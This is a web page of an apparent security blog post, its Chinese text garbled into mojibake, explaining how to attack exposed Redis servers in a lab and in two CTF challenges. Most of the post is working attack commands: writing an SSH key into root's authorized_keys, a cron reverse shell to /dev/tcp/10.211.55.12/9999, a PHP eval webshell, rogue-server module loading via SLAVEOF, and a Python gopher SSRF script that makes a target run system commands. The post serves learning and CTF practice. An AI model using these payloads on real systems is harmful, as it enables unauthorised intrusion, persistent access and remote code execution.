<html>
  <head>
    <meta charset="utf-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>å¦‚ä½•æ”»å‡»Redis | skkyblu3</title>
<link rel="shortcut icon" href="https://skyblu3519.github.io/favicon.ico?v=1721054258675">
<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
<link rel="stylesheet" href="https://skyblu3519.github.io/styles/main.css">
<link rel="alternate" type="application/atom+xml" title="å¦‚ä½•æ”»å‡»Redis | skkyblu3 - Atom Feed" href="https://skyblu3519.github.io/atom.xml">
<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">



    <meta name="description" content="æµ‹è¯•ç¯å¢ƒ
æ”»å‡»æœºï¼škali 10.211.55.12
Redisï¼šubuntu 10.211.55.18
æ”»å‡»æ‰‹æ³•
æœªæˆæƒç™»å½•
ä¿®æ”¹é…ç½®æ–‡ä»¶
bind 0.0.0.0		# å…è®¸è¿œç¨‹ç™»å½•
config set protected-mode ..." />
    <meta name="keywords" content="SSRF,Redis,æ¼æ´å¤ç°" />
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
    <script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
  </head>
  <body>
    <div class="main">
      <div class="main-content">
        <div class="site-header">
  <a href="https://skyblu3519.github.io">
  <img class="avatar" src="https://skyblu3519.github.io/images/avatar.png?v=1721054258675" alt="">
  </a>
  <h1 class="site-title">
    skkyblu3
  </h1>
  <p class="site-description">
    Welcome to Internet
  </p>
  <div class="menu-container">
    
      
        <a href="/" class="menu">
          é¦–é¡µ
        </a>
      
    
      
        <a href="/archives" class="menu">
          å½’æ¡£
        </a>
      
    
      
        <a href="/tags" class="menu">
          æ ‡ç­¾
        </a>
      
    
      
        <a href="/post/about" class="menu">
          å…³äº
        </a>
      
    
  </div>
  <div class="social-container">
    
      
    
      
    
      
    
      
    
      
    
  </div>
</div>

        <div class="post-detail">
          <article class="post">
            <h2 class="post-title">
              å¦‚ä½•æ”»å‡»Redis
            </h2>
            <div class="post-info">
              <span>
                2023-10-26
              </span>
              <span>
                9 min read
              </span>
              
                <a href="https://skyblu3519.github.io/tag/wOJluW2rm/" class="post-tag">
                  # SSRF
                </a>
              
                <a href="https://skyblu3519.github.io/tag/TYxLMWbotH/" class="post-tag">
                  # Redis
                </a>
              
                <a href="https://skyblu3519.github.io/tag/fKwN_Yn3T/" class="post-tag">
                  # æ¼æ´å¤ç°
                </a>
              
            </div>
            
              <img class="post-feature-image" src="https://skyblu3519.github.io/post-images/ru-he-gong-ji-redis.PNG" alt="">
            
            <div class="post-content-wrapper">
              <div class="post-content" v-pre>
                <h1 id="æµ‹è¯•ç¯å¢ƒ">æµ‹è¯•ç¯å¢ƒ</h1>
<p>æ”»å‡»æœºï¼škali 10.211.55.12<br>
Redisï¼šubuntu 10.211.55.18</p>
<h1 id="æ”»å‡»æ‰‹æ³•">æ”»å‡»æ‰‹æ³•</h1>
<h2 id="æœªæˆæƒç™»å½•">æœªæˆæƒç™»å½•</h2>
<p>ä¿®æ”¹é…ç½®æ–‡ä»¶</p>
<pre><code>bind 0.0.0.0		# å…è®¸è¿œç¨‹ç™»å½•
config set protected-mode no		# å…³é—­å®‰å…¨æ¨¡å¼
# requirepass your_password			æ³¨é‡Šæ‰è¿™ä¸€è¡Œï¼Œç¦ç”¨å¯†ç è®¤è¯ï¼Œä¸è¿‡é…ç½®æ–‡ä»¶ä¸­é»˜è®¤æ˜¯æ²¡æœ‰è¿™ä¸€è¡Œçš„
</code></pre>
<p>ubuntuä¸Šç”¨<code>redis-server /etc/redis.conf</code>å¯åŠ¨RedisæœåŠ¡æŒ‡å®šé…ç½®æ–‡ä»¶ã€‚</p>
<p>kaliä¸Šå¯ä»¥ç›´æ¥è¿æ¥åˆ°è¿™ä¸ªRedisï¼Œæ‰§è¡Œ<code>redis-cli -h 10.211.55.18</code>ã€‚</p>
<h2 id="å†™æ–‡ä»¶">å†™æ–‡ä»¶</h2>
<p>å†™æ–‡ä»¶æ‰§è¡Œçš„å‘½ä»¤ä¸º</p>
<pre><code>config set dir /tmp/  	# è®¾ç½®ä¿å­˜ç›®å½•
config set dbfilename evil.rdb     # è®¾ç½®ä¿å­˜æ–‡ä»¶å
set key &quot;value&quot;		# è¾“å…¥æ•°æ®
save 		# æ‰§è¡Œå¤‡ä»½
</code></pre>
<figure data-type="image" tabindex="1"><img src="https://skyblu3519.github.io/post-images/1698255103914.png" alt="" loading="lazy"></figure>
<p>æ–‡ä»¶ä¸­å†…å®¹å¦‚ä¸‹<br>
<img src="https://skyblu3519.github.io/post-images/1698255112857.png" alt="" loading="lazy"></p>
<p>åŸºäºè¿™ä¸ªç‰¹æ€§æˆ‘ä»¬å°±å¯ä»¥æ¥å†™sshå…¬é’¥ï¼Œwebshellï¼Œè®¡åˆ’ä»»åŠ¡åå¼¹shell</p>
<h3 id="sshå…¬é’¥ç™»å½•">SSHå…¬é’¥ç™»å½•</h3>
<p>ä¸‹è½½å¼€å¯sshæœåŠ¡</p>
<pre><code>apt install openssh-server
systemctl start ssh
</code></pre>
<p>ç¼–è¾‘sshé…ç½®æ–‡ä»¶<code>/etc/ssh/sshd_config</code></p>
<pre><code>PubkeyAuthentication yes			# å¯ç”¨å…¬é’¥è®¤è¯
PasswordAuthentication no			# ç¦ç”¨å¯†ç è®¤è¯
</code></pre>
<p>é‡å¯sshæœåŠ¡<code>systemctl restart ssh</code></p>
<p>åœ¨kaliä¸Šç”Ÿæˆå¯†é’¥å¯¹<code>ssh-keygen -t rsa</code><br>
<img src="https://skyblu3519.github.io/post-images/1698255129811.png" alt="" loading="lazy"></p>
<p>ä¿å­˜å…¬é’¥æ–‡ä»¶<code>(echo -e &quot;\n\n&quot;; cat /root/.ssh/id_rsa.pub; echo -e &quot;\n\n&quot;) &gt; kali </code></p>
<p>åœ¨Redisæ·»åŠ å…¬é’¥è®°å½•ï¼ŒåŒæ—¶ä¿å­˜åˆ°<code>/root/.ssh/authorized_keys</code></p>
<pre><code class="language-shell">cat kali | redis-cli -h 10.211.55.18 -x set kali 

redis-cli -h 10.211.55.18
10.211.55.18:6379&gt; config set dir /root/.ssh/
OK
10.211.55.18:6379&gt; config set dbfilename authorized_keys
OK
10.211.55.18:6379&gt; save
</code></pre>
<p><code>/root/.ssh/authorized_keys</code>å†…å®¹ä¸ºï¼Œè¿™æ˜¯å¯ä»¥è¢«è¯†åˆ«å‡ºæ¥çš„<br>
<img src="https://skyblu3519.github.io/post-images/1698255165760.png" alt="" loading="lazy"></p>
<p>å…å¯†ç™»å½•<code>ssh -i /root/.ssh/id_rsa root@10.211.55.18 </code><br>
<img src="https://skyblu3519.github.io/post-images/1698255175683.png" alt="" loading="lazy"></p>
<h3 id="å†™è®¡åˆ’ä»»åŠ¡">å†™è®¡åˆ’ä»»åŠ¡</h3>
<h4 id="å¿«é€Ÿå…¥é—¨">å¿«é€Ÿå…¥é—¨</h4>
<p>Linuxçš„è®¡åˆ’ä»»åŠ¡é€šå¸¸æ˜¯é€šè¿‡<code>cron</code>æœåŠ¡æ¥å®ç°çš„ã€‚<code>cron</code>æ˜¯ä¸€ä¸ªå®ˆæŠ¤è¿›ç¨‹ï¼Œå¯ä»¥å®šæœŸæ‰§è¡Œç”¨æˆ·é¢„å®šçš„ä»»åŠ¡ã€‚ç”¨æˆ·å¯ä»¥é€šè¿‡<code>crontab</code>å‘½ä»¤æ¥ç®¡ç†è‡ªå·±çš„è®¡åˆ’ä»»åŠ¡ã€‚</p>
<p><strong>å¦‚ä½•å†™è®¡åˆ’ä»»åŠ¡ï¼š</strong></p>
<ol>
<li>**ç¼–è¾‘Cronä»»åŠ¡ï¼š**è¾“å…¥<code>crontab -e</code>å‘½ä»¤ï¼Œè¿™ä¼šæ‰“å¼€ä¸€ä¸ªæ–‡æœ¬ç¼–è¾‘å™¨ï¼Œå…è®¸ä½ ç¼–è¾‘ä½ çš„è®¡åˆ’ä»»åŠ¡ã€‚</li>
<li>**æ·»åŠ ä»»åŠ¡ï¼š**åœ¨ç¼–è¾‘å™¨ä¸­ï¼Œä½ å¯ä»¥æ·»åŠ æ–°çš„ä»»åŠ¡ã€‚ä»»åŠ¡çš„æ ¼å¼å¦‚ä¸‹ï¼š</li>
</ol>
<pre><code class="language-javascript">* * * * * /path/to/command arg1 arg2
</code></pre>
<p>å­—æ®µçš„æ„ä¹‰ï¼š</p>
<ul>
<li>ç¬¬1ä¸ª *ï¼šåˆ†é’Ÿï¼ˆ0-59ï¼‰</li>
<li>ç¬¬2ä¸ª *ï¼šå°æ—¶ï¼ˆ0-23ï¼‰</li>
<li>ç¬¬3ä¸ª *ï¼šä¸€ä¸ªæœˆä¸­çš„ç¬¬å‡ å¤©ï¼ˆ1-31ï¼‰</li>
<li>ç¬¬4ä¸ª *ï¼šæœˆä»½ï¼ˆ1-12ï¼‰</li>
<li>ç¬¬5ä¸ª *ï¼šä¸€å‘¨ä¸­çš„ç¬¬å‡ å¤©ï¼ˆ0-7ï¼Œ0å’Œ7éƒ½ä»£è¡¨æ˜ŸæœŸæ—¥ï¼‰</li>
<li><strong>/path/to/command arg1 arg2</strong>ï¼šè¦è¿è¡Œçš„å‘½ä»¤åŠå…¶å‚æ•°</li>
</ul>
<p>ç¤ºä¾‹ï¼šæ¯å¤©çš„5:30è¿è¡Œ <strong>/path/to/script.sh</strong></p>
<pre><code>30 5 * * * /path/to/script.sh
</code></pre>
<p><strong>å¦‚ä½•å–æ¶ˆè®¡åˆ’ä»»åŠ¡ï¼š</strong></p>
<ol>
<li>**åˆ—å‡ºå½“å‰çš„Cronä»»åŠ¡ï¼š**è¾“å…¥ <code>**crontab -l**</code> å‘½ä»¤ï¼Œè¿™ä¼šåˆ—å‡ºä½ å½“å‰çš„æ‰€æœ‰è®¡åˆ’ä»»åŠ¡ã€‚</li>
<li><strong>åˆ é™¤ç‰¹å®šä»»åŠ¡</strong>
<ul>
<li>è¾“å…¥ <code>**crontab -e**</code> å‘½ä»¤ï¼Œæ‰“å¼€ç¼–è¾‘å™¨ã€‚</li>
<li>åœ¨ç¼–è¾‘å™¨ä¸­ï¼Œæ‰¾åˆ°å¹¶åˆ é™¤ä½ æƒ³å–æ¶ˆçš„ä»»åŠ¡çš„ç›¸åº”è¡Œã€‚</li>
</ul>
</li>
<li>**åˆ é™¤æ‰€æœ‰ä»»åŠ¡ï¼š**å¦‚æœä½ æƒ³åˆ é™¤æ‰€æœ‰ä»»åŠ¡ï¼Œå¯ä»¥ä½¿ç”¨ <code>**crontab -r**</code> å‘½ä»¤ã€‚</li>
</ol>
<p><strong>/var/spool/cron/ç›®å½•</strong></p>
<ul>
<li><strong>/var/spool/cron/</strong> æ˜¯ Linux ç³»ç»Ÿä¸­ä¸€ä¸ªç‰¹æ®Šçš„ç›®å½•ï¼Œç”¨äºå­˜å‚¨ç”¨æˆ·çš„ <strong>crontab</strong> æ–‡ä»¶ã€‚</li>
<li>å½“ç”¨æˆ·ä½¿ç”¨ <strong>crontab -e</strong> å‘½ä»¤ç¼–è¾‘è‡ªå·±çš„ cron ä»»åŠ¡æ—¶ï¼Œè¿™äº›ä»»åŠ¡è¢«ä¿å­˜åœ¨ <strong>/var/spool/cron/</strong> ç›®å½•ä¸‹ã€‚</li>
<li>æ¯ä¸ªç”¨æˆ·æœ‰ä¸€ä¸ªä¸å…¶ç”¨æˆ·ååŒåçš„æ–‡ä»¶ã€‚</li>
<li><strong>cron</strong> å®ˆæŠ¤è¿›ç¨‹ä¼šå®šæœŸè¯»å– <strong>/var/spool/cron/</strong> ç›®å½•ä¸­çš„æ–‡ä»¶ï¼Œæ ¹æ®å…¶ä¸­å®šä¹‰çš„è®¡åˆ’æ‰§è¡Œç›¸åº”çš„ä»»åŠ¡ã€‚</li>
</ul>
<h4 id="é€šè¿‡è®¡åˆ’ä»»åŠ¡åå¼¹shell">é€šè¿‡è®¡åˆ’ä»»åŠ¡åå¼¹shell</h4>
<blockquote>
<p>è¿™ä¸ªæ–¹æ³•åªèƒ½åœ¨Centosä¸Šä½¿ç”¨ï¼ŒUbuntuä¸Šæ˜¯è¡Œä¸é€šçš„ï¼ŒåŸå› å¦‚ä¸‹:</p>
<p>å› ä¸ºé»˜è®¤rediså†™æ–‡ä»¶åæ˜¯644çš„æƒé™ï¼Œä½†ubuntuè¦æ±‚æ‰§è¡Œå®šæ—¶ä»»åŠ¡æ–‡ä»¶<code>/var/spool/cron/crontabs/&lt;username&gt;</code>æƒé™å¿…é¡»æ˜¯<code>600</code>ä¹Ÿå°±æ˜¯<code>-rw-------</code>æ‰ä¼šæ‰§è¡Œã€‚å¦åˆ™ä¼šæŠ¥é”™(root) INSECURE MODE (mode 0600 expected)ã€‚è€ŒCentosçš„å®šæ—¶ä»»åŠ¡æ–‡ä»¶<code>/var/spool/cron/&lt;username&gt;</code>æƒé™644ä¹Ÿèƒ½æ‰§è¡Œ<br>
<img src="https://skyblu3519.github.io/post-images/1698255198557.png" alt="" loading="lazy"></p>
<p>åŒæ—¶ï¼Œredisä¿å­˜RDBä¼šå­˜åœ¨ä¹±ç ã€‚è¿™åœ¨Ubuntuä¸Šä¼šæŠ¥é”™ï¼Œè€Œåœ¨Centosä¸Šä¸ä¼šæŠ¥é”™ã€‚</p>
<p>å¦å¤–ï¼Œç”±äºç³»ç»Ÿçš„ä¸åŒï¼Œcrontrabå®šæ—¶æ–‡ä»¶ä½ç½®ä¹Ÿä¼šä¸åŒ</p>
<ul>
<li>Centosçš„å®šæ—¶ä»»åŠ¡æ–‡ä»¶åœ¨<code>/var/spool/cron/&lt;username&gt;</code></li>
<li>Ubuntuå®šæ—¶ä»»åŠ¡æ–‡ä»¶åœ¨<code>/var/spool/cron/crontabs/&lt;username&gt;</code></li>
</ul>
</blockquote>
<pre><code class="language-shell"># * * * * * è¡¨ç¤ºæ¯åˆ†é’Ÿã€æ¯å°æ—¶ã€æ¯å¤©ã€æ¯æœˆã€æ¯å‘¨çš„æ¯å¤©éƒ½ä¼šæ‰§è¡Œ
set x &quot;\n* * * * * bash -i &gt;&amp; /dev/tcp/10.211.55.12/9999 0&gt;&amp;1\n&quot;
config set dir /var/spool/cron/
config set dbfilename root
save
</code></pre>
<p><code>/var/spool/cron/root</code>æ–‡ä»¶å†…å®¹<br>
<img src="https://skyblu3519.github.io/post-images/1698255225041.png" alt="" loading="lazy"></p>
<h3 id="å†™webshell">å†™WebShell</h3>
<p>ç½‘ç«™çš„ç»å¯¹è·¯å¾„å·²çŸ¥</p>
<pre><code class="language-shell">config set dir /var/www/html/
config set dbfilename shell.php
set x &quot;&lt;?php @eval($_POST['test']);?&gt;&quot;
save
</code></pre>
<h2 id="ä¸»ä»å¤åˆ¶">ä¸»ä»å¤åˆ¶</h2>
<p>ä¸»ä»æ¨¡å¼å°±æ˜¯æŒ‡ä½¿ç”¨ä¸€ä¸ªrediså®ä¾‹ä½œä¸ºä¸»æœºï¼Œå…¶ä»–å®ä¾‹éƒ½ä½œä¸ºå¤‡ä»½æœºï¼Œå…¶ä¸­ä¸»æœºå’Œä»æœºæ•°æ®ç›¸åŒï¼Œè€Œä»æœºåªè´Ÿè´£è¯»ï¼Œä¸»æœºåªè´Ÿè´£å†™ã€‚</p>
<p>åœ¨ä¸¤ä¸ªRediså®ä¾‹è®¾ç½®ä¸»ä»æ¨¡å¼çš„æ—¶å€™ï¼ŒRedisçš„ä¸»æœºå®ä¾‹å¯ä»¥é€šè¿‡FULLRESYNCåŒæ­¥æ–‡ä»¶åˆ°ä»æœºä¸Šã€‚ç„¶ååœ¨ä»æœºä¸ŠåŠ è½½soæ–‡ä»¶ï¼Œæˆ‘ä»¬å°±å¯ä»¥æ‰§è¡Œæ‹“å±•çš„æ–°å‘½ä»¤äº†ã€‚<br>
<img src="https://skyblu3519.github.io/post-images/1698255247615.png" alt="" loading="lazy"></p>
<p>å¤§è‡´åŸç†ä¸Šå°±æ˜¯RedisåŠ è½½äº†ä¸€ä¸ªæ¶æ„æ¨¡å—ï¼Œè®©Rediså‘½ä»¤è¡Œå¯ä»¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ã€‚å…‹éš†<a href="https://github.com/n0b0dyCN/RedisModules-ExecuteCommand">RedisModules-ExecuteCommand</a>åˆ°æœ¬åœ°ï¼Œè¿›å…¥srcç›®å½•æ‰§è¡Œmakeï¼Œä¼šæç¤ºä¸€äº›è­¦å‘Šä½†ä¸å½±å“ã€‚<br>
<img src="https://skyblu3519.github.io/post-images/1698255256181.png" alt="" loading="lazy"></p>
<p>æ‰§è¡Œå®Œæˆåï¼Œåœ¨ç›®å½•ä¸‹å‡ºç°çš„<code>module.so</code>å°±æ˜¯æˆ‘ä»¬è®©ç›®æ ‡åŠ è½½çš„æ¶æ„æ¨¡å—ã€‚åœ¨rediså‘½ä»¤è¡Œä¸­ä½¿ç”¨<code>MODULE LOAD PATH</code>åŠ è½½<br>
<img src="https://skyblu3519.github.io/post-images/1698255276426.png" alt="" loading="lazy"></p>
<p>ä¹Ÿå¯ä»¥å¯åŠ¨reidsæ—¶ç”¨<code>--loadmodule</code>æŒ‡å®šåŠ è½½çš„æ¨¡å—<br>
<img src="https://skyblu3519.github.io/post-images/1698255285851.png" alt="" loading="lazy"></p>
<p>çŸ¥é“å¤§è‡´åŸç†åï¼Œäº†è§£ä¸‹è¿™ä¸ªè„šæœ¬çš„ç”¨æ³•<a href="https://github.com/n0b0dyCN/redis-rogue-server">https://github.com/n0b0dyCN/redis-rogue-server</a>ã€‚å…‹éš†ä¹‹åå°†ç›®å½•ä¸‹çš„<code>exp.so</code>æ›¿æ¢ä¸ºæˆ‘ä»¬ä¹‹å‰ç¼–è¯‘å‡ºæ¥çš„<code>module.so</code>ï¼ˆæ³¨æ„åç§°ä½¿ç”¨<code>exp.so</code>ï¼‰ï¼ŒæŒ‡å®šæœ¬æœºIPå’Œç›®æ ‡IPè¿è¡Œï¼Œç„¶åå°±å¯ä»¥æ‰§è¡Œå‘½ä»¤äº†</p>
<pre><code class="language-shell">python3 redis-rogue-server.py --lhost 10.211.55.12 --rhost 10.211.55.18
</code></pre>
<figure data-type="image" tabindex="2"><img src="https://skyblu3519.github.io/post-images/1698255317628.png" alt="" loading="lazy"></figure>
<p>ä¸Šé¢æ˜¯ç›®æ ‡å’Œæ”»å‡»æœºå¯ä»¥äº’ç›¸è®¿é—®çš„æƒ…å†µï¼Œè¿˜æœ‰ä¸€ç§Redisåœ¨å†…ç½‘æ— æ³•è¢«ç›´æ¥è®¿é—®çš„æƒ…å†µã€‚ä¹‹å‰æŸé¹­æ¯æ‰¾äº†ä¸€ä¸ªè„šæœ¬<a href="https://github.com/Dliv3/redis-rogue-server">https://github.com/Dliv3/redis-rogue-server</a>ï¼Œè¿™é‡Œæœ‰ä¸€ä¸ªè¢«åŠ¨è¿æ¥æ¨¡å¼å°±å¯ä»¥åšã€‚<br>
<img src="https://skyblu3519.github.io/post-images/1698255326102.png" alt="" loading="lazy"></p>
<p>ä¸‹è½½è¿™ä¸ªè„šæœ¬ï¼ŒåŒæ ·å°†é‡Œé¢çš„<code>exp.so</code>æ›¿æ¢æ‰ã€‚ç„¶åç”¨<code>python3 redis-rogue-server.py --server-only</code>å¯åŠ¨ï¼Œè„šæœ¬ä¼šç›‘å¬<code>21000</code>ç«¯å£<br>
<img src="https://skyblu3519.github.io/post-images/1698255335899.png" alt="" loading="lazy"></p>
<p>å½“åœ¨ç›®æ ‡æœºå™¨ä¸Šæ‰§è¡Œ<code>slaveof</code>å‘½ä»¤åï¼Œslaveä¼šå°†è¿™äº›æ•°æ®ä¿å­˜åˆ°è®¾ç½®çš„<code>dbfilename</code>æ–‡ä»¶ä¸­ï¼ˆé»˜è®¤æ˜¯<code>./dump.db</code>ï¼‰ã€‚</p>
<pre><code class="language-shell">10.211.55.18:6379&gt; config set dir /tmp
OK
10.211.55.18:6379&gt; config set dbfilename evil.rdb
OK
10.211.55.18:6379&gt; slaveof 10.211.55.12 21000
OK
</code></pre>
<p>æ•°æ®ä¼ å…¥æˆåŠŸ<br>
<img src="https://skyblu3519.github.io/post-images/1698255364564.png" alt="" loading="lazy"></p>
<p>ç›®æ ‡æœåŠ¡å™¨ä¸Šå·²ç»åŒæ­¥å¥½æ–‡ä»¶äº†<br>
<img src="https://skyblu3519.github.io/post-images/1698255373488.png" alt="" loading="lazy"></p>
<p>ä½¿ç”¨<code>module load /tmp/evil.rdb</code>åŠ è½½ï¼Œç„¶åå°±å¯ä»¥æ‰§è¡Œå‘½ä»¤äº†<br>
<img src="https://skyblu3519.github.io/post-images/1698255382437.png" alt="" loading="lazy"></p>
<h1 id="ctf">CTF</h1>
<h2 id="2023æŸé¹­æ¯ç»¼åˆ7">[2023æŸé¹­æ¯]ç»¼åˆ7</h2>
<p>æ²¡æœ‰ç¯å¢ƒå°±ç®€å•å¤ç›˜ä¸‹ã€‚å‚è€ƒ<a href="http://blog.xmcve.com/2023/10/13/%E6%9F%8F%E9%B9%AD%E6%9D%AF2023-Writeup/#title-4">æ˜Ÿç›Ÿçš„WP</a></p>
<p>å…¶å®æ‹¿åˆ°Redisä¿¡æ¯ä¹‹åå°±æ˜¯ä¸€ä¸ªç®€å•çš„Redisåˆ©ç”¨ï¼Œè™½ç„¶Javaæœºä¸Šæ²¡æœ‰redis-cliï¼Œä½†æ˜¯å¯ä»¥ä¸Šä¼ ä¸ªfrpcå»åšå†…ç½‘ç©¿é€ï¼Œç„¶åå°±å¯ä»¥åœ¨kaliä¸Šæ”»å‡»Redisäº†ã€‚</p>
<p>Anywayï¼Œå†™è®¡åˆ’ä»»åŠ¡ã€å…¬é’¥ã€ä¸»ä»å¤åˆ¶éƒ½è¡Œï¼Œä¸è¿‡æ²¡æœ‰æƒ³åˆ°frpcç¡®å®æ˜¯æ¸—é€ç»éªŒå¤ªå°‘äº†ğŸ˜¢</p>
<h2 id="ç½‘é¼æ¯-2020-ç„æ­¦ç»„ssrfme">[ç½‘é¼æ¯ 2020 ç„æ­¦ç»„]SSRFMe</h2>
<p>ç”¨<code>0.0.0.0</code>ç»•è¿‡<br>
<img src="https://skyblu3519.github.io/post-images/1698255412679.png" alt="" loading="lazy"></p>
<p>ä¼ å‚<code>?url=http://0.0.0.0/hint.php</code></p>
<pre><code class="language-php">// hint.php
&lt;?php
if($_SERVER['REMOTE_ADDR']===&quot;127.0.0.1&quot;){
  highlight_file(__FILE__);
}
if(isset($_POST['file'])){
  file_put_contents($_POST['file'],&quot;&lt;?php echo 'redispass is root';exit();&quot;.$_POST['file']);
}
</code></pre>
<p>æç¤ºredisï¼Œä½¿ç”¨gopherè®©ç›®æ ‡æ‰§è¡Œä¸»ä»å¤åˆ¶</p>
<pre><code class="language-php">from urllib.parse import quote
import requests
# tcp_payload = &quot;auth root\r\nconfig get dir\r\nquit\r\n&quot;
tcp_payload = &quot;auth root\r\nconfig set dir /tmp\r\nconfig set dbfilename evil.rdb\r\nSLAVEOF 47.115.227.70 2100\r\nMODULE LOAD /tmp/evil.rdb\r\nsystem.exec 'nl /*'\r\nquit\r\n&quot;
print(tcp_payload)
inner_url = f&quot;gopher://0.0.0.0:6379/_{quote(quote(tcp_payload))}&quot;
# print(inner_url)
url = &quot;http://5a210ce2-e8d9-49c2-a823-f715204a1cce.node4.buuoj.cn:81/?url=&quot; + inner_url
resp = requests.get(url)
print(resp.text)
</code></pre>
<p>è¿™é‡Œä¼¼ä¹æ˜¯æˆ‘VPSçš„é—®é¢˜ï¼Œæ— æ³•ç»™ä»æœºä¼ æ•°æ®<br>
<img src="https://skyblu3519.github.io/post-images/1698255431266.png" alt="" loading="lazy"></p>
<p>å…ˆè¿™æ ·å§....</p>
<h1 id="å‚è€ƒé“¾æ¥">å‚è€ƒé“¾æ¥</h1>
<p><a href="https://xz.aliyun.com/t/12362">https://xz.aliyun.com/t/12362</a><br>
<a href="https://www.cnblogs.com/loongten/p/15838580.html">https://www.cnblogs.com/loongten/p/15838580.html</a><br>
<a href="https://paper.seebug.org/975/">https://paper.seebug.org/975/</a><br>
<a href="https://github.com/Dliv3/redis-rogue-server">https://github.com/Dliv3/redis-rogue-server</a><br>
<a href="https://github.com/n0b0dyCN/RedisModules-ExecuteCommand">https://github.com/n0b0dyCN/RedisModules-ExecuteCommand</a></p>

              </div>
              <div class="toc-container">
                <ul class="markdownIt-TOC">
<li><a href="#%E6%B5%8B%E8%AF%95%E7%8E%AF%E5%A2%83">æµ‹è¯•ç¯å¢ƒ</a></li>
<li><a href="#%E6%94%BB%E5%87%BB%E6%89%8B%E6%B3%95">æ”»å‡»æ‰‹æ³•</a>
<ul>
<li><a href="#%E6%9C%AA%E6%8E%88%E6%9D%83%E7%99%BB%E5%BD%95">æœªæˆæƒç™»å½•</a></li>
<li><a href="#%E5%86%99%E6%96%87%E4%BB%B6">å†™æ–‡ä»¶</a>
<ul>
<li><a href="#ssh%E5%85%AC%E9%92%A5%E7%99%BB%E5%BD%95">SSHå…¬é’¥ç™»å½•</a></li>
<li><a href="#%E5%86%99%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1">å†™è®¡åˆ’ä»»åŠ¡</a>
<ul>
<li><a href="#%E5%BF%AB%E9%80%9F%E5%85%A5%E9%97%A8">å¿«é€Ÿå…¥é—¨</a></li>
<li><a href="#%E9%80%9A%E8%BF%87%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1%E5%8F%8D%E5%BC%B9shell">é€šè¿‡è®¡åˆ’ä»»åŠ¡åå¼¹shell</a></li>
</ul>
</li>
<li><a href="#%E5%86%99webshell">å†™WebShell</a></li>
</ul>
</li>
<li><a href="#%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6">ä¸»ä»å¤åˆ¶</a></li>
</ul>
</li>
<li><a href="#ctf">CTF</a>
<ul>
<li><a href="#2023%E6%9F%8F%E9%B9%AD%E6%9D%AF%E7%BB%BC%E5%90%887">[2023æŸé¹­æ¯]ç»¼åˆ7</a></li>
<li><a href="#%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E7%8E%84%E6%AD%A6%E7%BB%84ssrfme">[ç½‘é¼æ¯ 2020 ç„æ­¦ç»„]SSRFMe</a></li>
</ul>
</li>
<li><a href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5">å‚è€ƒé“¾æ¥</a></li>
</ul>

              </div>
            </div>
          </article>
        </div>

        
          <div class="next-post">
            <div class="next">ä¸‹ä¸€ç¯‡</div>
            <a href="https://skyblu3519.github.io/post/tomcat-sessioncve-2020-9484fan-xu-lie-hua-lou-dong-fu-xian/">
              <h3 class="post-title">
                Tomcat Sessionï¼ˆCVE-2020-9484ï¼‰ååºåˆ—åŒ–æ¼æ´å¤ç°
              </h3>
            </a>
          </div>
        

        

        <div class="site-footer">
  Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a>
  <a class="rss" href="https://skyblu3519.github.io/atom.xml" target="_blank">
    <i class="ri-rss-line"></i> RSS
  </a>
</div>

      </div>
    </div>

    <script>
      hljs.initHighlightingOnLoad()

      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");

      // This should probably be throttled.
      // Especially because it triggers during smooth scrolling.
      // https://lodash.com/docs/4.17.10#throttle
      // You could do like...
      // window.addEventListener("scroll", () => {
      //    _.throttle(doThatStuff, 100);
      // });
      // Only not doing it here to keep this Pen dependency-free.

      window.addEventListener("scroll", event => {
        let fromTop = window.scrollY;

        mainNavLinks.forEach((link, index) => {
          let section = document.getElementById(decodeURI(link.hash).substring(1));
          let nextSection = null
          if (mainNavLinks[index + 1]) {
            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
          }
          if (section.offsetTop <= fromTop) {
            if (nextSection) {
              if (nextSection.offsetTop > fromTop) {
                link.classList.add("current");
              } else {
                link.classList.remove("current");    
              }
            } else {
              link.classList.add("current");
            }
          } else {
            link.classList.remove("current");
          }
        });
      });

    </script>
  </body>
</html>
